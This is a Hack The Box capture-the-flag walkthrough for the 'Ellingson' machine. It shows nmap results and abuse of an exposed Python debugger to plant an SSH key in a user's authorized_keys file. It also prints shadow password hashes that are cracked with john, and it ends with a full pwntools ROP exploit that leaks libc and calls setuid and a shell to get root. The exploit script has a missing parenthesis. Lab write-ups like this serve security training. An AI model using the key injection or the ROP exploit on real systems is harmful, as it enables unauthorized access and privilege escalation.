@@ -1,0 +1,220 @@
+Ellingson
+
+Lets try to hack the Gibson!
+
+Medium Level box
+
+IP Address - 10.10.10.139
+
+First nmap and find a webapp plus ssh running. So first thing
+is scanning the webapp to check for any vulnerabilities or exploits.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
+|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
+|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+| http-title: Ellingson Mineral Corp
+|_Requested resource was http://10.10.10.139/index
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+After scanning around we find a link in dirbuster that looks like
+a python debugger so we head over to take a look and see if it is
+vulnerable.
+
+Link found - http://10.10.10.139/articles/elements.html?__debugger__=yes&cmd=
+
+Trying out the debugger on the page you will see the ability to execute
+python commands and view system infomation. With other security params
+in place it was difficult to achieve a reverse shell for me at the time
+so we check for other routes to go about getting in like a ssh key or setting
+one in ourselves. 
+
+Python os commands to dig around the box in the /home directory ended up
+noticing that permissions were open to the following file -
+
+/home/hal/.ssh/authorized_keys
+
+Now we can try and write our ssh key into the file and in theory
+we should be able to login to the user hal. So first we either
+use a pre made key you use for Hackthebox stuff or make another one.
+
+command example $ssh-keygen -t rsa
+
+Leave passphrase empty for simplicity and so it doesn't trip you up 
+in the exploit. Make sure its saved in the default /home/user/.ssh 
+directory on your linux box. Or on Kali or root directory ~/.ssh you 
+can find your new key there.
+
+We now make some code for the python debugger. Here is the way I did and again always different
+methods to go about something like this. Here is how I snuck in my key to the
+authorized_keys file for hal.  
+
+------------------------------------------------------------------------------------
+
+--Example--
+
+file_name = '/home/hal/.ssh/authorized_keys'
+
+pub_key = 'ssh-rsa LzzM7wtzISFi8fSt9t47efX2OFHXoUqq2K5WmVe2TA8ZDo1+Oi79jgWJt2ZBhYukUcRoi07uaC5fWkj9qMIW83NMdjbK6ZH7C0WhzGGZbbIMdj3LoCyYt/nVlbqsKceGQLz1cm+z7TYQIdtCOVw5hO/RdfBuZUZLLPz4QVWwiocqazCbbvl6fIsEZdLSynKXXByXMZivET1V7Ylraqj3dJofUByv user@parrot' 
+
+opened_file = open(file_name, 'w')
+
+opened_file.write(pub_key)
+
+opened_file.close()
+
+------------------------------------------------------------------------------------
+
+We now see our key has been written into the file and we can now check and see if the
+code worked. If everything was done right you should now have the hal user now and 
+if you have trouble with key try ssh-add and it will plug in any key you need to ssh.
+
+hal@ellingson:/$
+
+We now have hal and look for priv esc as we still cannot read the user.txt file which is
+located in the margo directory. Using LinEnum plus other enumeration scripts for linux
+privlage escalation we find a sensitive file with hashes in them. 
+
+--------------------------------------------------------------------------------------
+
+theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
+hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
+margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
+duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
+
+--------------------------------------------------------------------------------------
+We plug these hashes into john or johnny either one or hashcat I prefer john usually.
+running john hashes.txt we after a while get output for the margo user and attempt to
+login and see if that is our way to the user flag.
+---------------------------------------------------------------------------------------
+
+hal@ellingson:/tmp$ su margo
+Password: 
+margo@ellingson:/tmp$ cd /home/margo
+margo@ellingson:~$ ls
+user.txt
+margo@ellingson:~$ cat user.txt
+d0ff9e3f9da8bb00aaa6************
+
+---------------------------------------------------------------------------------------
+
+Got it so now we pwned the user flag and move further on the box to see if anything can
+lead us to root.
+
+Just like the movie Hackers which is like the role model for how we roll lmfao. I found
+a file called garbage here - /usr/bin/garbage so now we run the file and see its possibly
+vulnerable to overflow and should be the path to our root flag.
+
+Running the file you see the output like so -
+
+Enter access password:
+
+So we move with the following command to get the file off the box so we can work on it locally.
+
+scp margo@10.10.10.139:/usr/bin/garbage /home/user/Desktop/garbage # This will get the file off the box
+
+Now that we got the file we begin our long fought out journey of exploiting the binary file. We check
+off the bat with a string search command to dump any visible strings we can find in the executable. 
+
+user@parrot:/$strings garbage
+
+Digging around was able to locate the password it is looking for when asking for it at the
+prompt -
+
+The tankers have stopped capsizingBalance is $%d
+%llx%lldw/var/secret/accessfile.txtuser: %lu cleared to access this applicationuser: %lu not authorized to access this applicationUser is not authorized to access this application. This attempt has been logged.errorEnter access password: N3veRF3@r1iSh3r3!access granted
+
+As you can see in the dump we located our first piece of this drawn out puzzle to begin
+the process of breaking thru the binary. We now start using other tools now to pull the 
+needed parameters to exploit the executable.
+
+password - N3veRF3@r1iSh3r3!
+
+After digging thru we eventually get the needed data to plug into our code and check
+if we can exploit it locally and a similar concept will or should be availble remotely.
+After the local exploit worked we move to the remote version and adjust the exploit to
+fit our needs.
+
+For a detailed walk thru pm me and I can walk you thru if not check out lppsec video
+on hackthebox.eu for Ellingson for a better example of moving thru the binary. Here
+will just explain the final exploit code I used which lead me to root.
+
+
+------------------------------------------------------------------------------------------------------------------------
+#pwntools love it!
+
+from pwn import *
+
+context(terminal=['tmux','new-window']) 
+#Set terminal up
+margo = ssh("margo","10.10.10.139",22,"password_here")
+#After you crack the password from earlier place it here like logging in
+context(os='linux', arch='amd64') 
+#Set the arch and os parms
+p = margo.process("garbage") 
+#Set the process and user running it remotely
+password = 'N3veRF3@r1iSh3r3!' + '\x00' 
+#Set the password for the binary add NOP
+
+rsp_offset = 136
+#The offset found in gdb
+auth = p64(0x401513)
+#Authenication function
+got_puts = p64(0x404028)
+#Gadget got puts
+pop_rdi = p64(0x40179b)
+#Gadget pop rdi
+plt_puts = p64(0x401050
+#Puts function
+
+junk = 'A' * (rsp_offset - len(password))
+#Calculate the junk we place for overflow minus password length
+payload = password + junk + pop_rdi + got_puts + plt_puts + auth
+#Add together the functions to generate our rop chain
+p.sendline(payload)
+#Send the first payload
+p.recvuntil('ed.')
+#Keep until access grant(ed.) from earlier output
+
+leaked_puts = u64(p.recvn(8).strip().ljust(8,'\x00'))
+#Place everything in leaked puts variable
+
+#LIBC variables needed imported to notice setuid 
+libc_puts = 0x809c0
+libc_system = 0x4f440
+libc_sh = 0x1b3e9a
+libc_setuid = 0xe5970
+
+#Now take and setup our libc calculations
+libc_base = leaked_puts - libc_puts
+system = p64(libc_base + libc_system)
+sh = p64(libc_base + libc_sh)
+setuid = p64(libc_setuid + libc_base)
+
+#Our Final payload and rop chain
+payload = password + junk + pop_rdi + '\x00'*8 + setuid + pop_rdi + sh + system
+p.sendline(payload)
+p.interactive()
+
+--------------------------------------------------------------------------------------------------------------------------
+
+voilia we have root! 
+
+Enter access password: 
+access granted.
+# $ ls
+user.txt
+# $ cat /root/root.txt
+1cc73a448021ea81aee6c0***************
+
+
+We have the Gibson! you are now 1337
+
+#Hacktheplanet
+
+--------------------------------------------------------------------------------------------------------------------------
+
